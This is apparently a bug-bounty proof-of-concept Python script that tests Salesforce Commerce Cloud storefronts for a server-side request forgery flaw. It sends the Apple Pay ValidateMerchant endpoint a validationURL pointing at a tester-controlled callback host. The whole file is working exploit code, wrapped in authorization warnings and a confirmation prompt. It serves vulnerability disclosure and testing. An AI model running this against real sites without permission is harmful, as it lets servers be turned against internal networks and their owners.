#!/usr/bin/env python3
"""
Generic PoC for unvalidated Apple Pay `validationURL` SSRF on Salesforce
Commerce Cloud (SFCC) storefronts using the `ApplePay-ValidateMerchant`
controller pattern.

AUTHORIZATION REQUIRED. Only run this against a host you have explicit,
written permission to test (e.g. your own in-scope bug bounty target).
There is no default target -- you must supply one.

What this does:
  1. GETs a page on the target to pick up an anonymous session cookie
     (mirrors what any visitor's browser does automatically).
  2. POSTs a JSON body to the ApplePay-ValidateMerchant controller with
     `validationURL` pointed at a callback host you control (e.g. an
     interactsh / Burp Collaborator domain).
  3. Reports the HTTP status the target returned.

The actual proof of SSRF is NOT in this script's output -- it's in
whatever your callback listener (interactsh-client, Collaborator, a
netcat listener, etc.) independently observes. A generic "Unknown
error" / HTTP 500 response from the target is expected and does not
mean the test failed -- see docs/sequence-diagram.md for why.
"""

import argparse
import json
import sys
import urllib.request
import http.cookiejar


def build_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def establish_session(opener, base_url, user_agent):
    req = urllib.request.Request(
        base_url,
        headers={"User-Agent": user_agent},
    )
    with opener.open(req, timeout=15) as resp:
        return resp.status


def send_validate_merchant(opener, endpoint_url, callback_url, hostname, user_agent):
    body = json.dumps({
        "validationURL": callback_url,
        "hostname": hostname,
    }).encode("utf-8")

    req = urllib.request.Request(
        endpoint_url,
        data=body,
        method="POST",
        headers={
            "User-Agent": user_agent,
            "Content-Type": "application/json",
            "Accept": "application/json",
        },
    )
    try:
        with opener.open(req, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Apple Pay ValidateMerchant SSRF (SFCC storefronts). "
                    "Requires explicit authorization to test the target."
    )
    parser.add_argument(
        "--base-url", required=True,
        help="A normal page on the target to pick up a session cookie, "
             "e.g. https://shop.example.com/en-us/cart",
    )
    parser.add_argument(
        "--endpoint", required=True,
        help="Full ValidateMerchant controller URL, e.g. "
             "https://shop.example.com/on/demandware.store/Sites-YourSite-Site/"
             "en_US/__SYSTEM__ApplePay-ValidateMerchant",
    )
    parser.add_argument(
        "--callback-url", required=True,
        help="A URL on infrastructure YOU control (interactsh/Collaborator/etc.), "
             "e.g. https://<your-unique-id>.oast.live/poc",
    )
    parser.add_argument(
        "--hostname", required=True,
        help="Value to send as 'hostname' in the request body -- typically the "
             "target's own domain, matching what the real client-side code sends.",
    )
    parser.add_argument(
        "--user-agent", default="Mozilla/5.0",
        help="User-Agent to send. Set this to satisfy any program-required "
             "UA tagging rule (e.g. 'Mozilla/5.0 BugBounty-YourHandle').",
    )
    args = parser.parse_args()

    print("[!] Only proceed if you have explicit authorization for this target.")
    confirm = input(f"Type the target hostname to confirm ({args.base_url}): ")
    if confirm.strip() not in args.base_url:
        print("Confirmation did not match. Aborting.")
        sys.exit(1)

    opener = build_opener()

    print(f"[*] Establishing session via {args.base_url}")
    status = establish_session(opener, args.base_url, args.user_agent)
    print(f"    -> HTTP {status}")

    print(f"[*] Sending validationURL={args.callback_url!r} to {args.endpoint}")
    status, body = send_validate_merchant(
        opener, args.endpoint, args.callback_url, args.hostname, args.user_agent
    )
    print(f"    -> HTTP {status}")
    print(f"    -> body: {body}")
    print()
    print("[*] Now check your callback listener for an inbound HTTP request.")
    print("    A generic error here is expected -- see docs/sequence-diagram.md.")


if __name__ == "__main__":
    main()
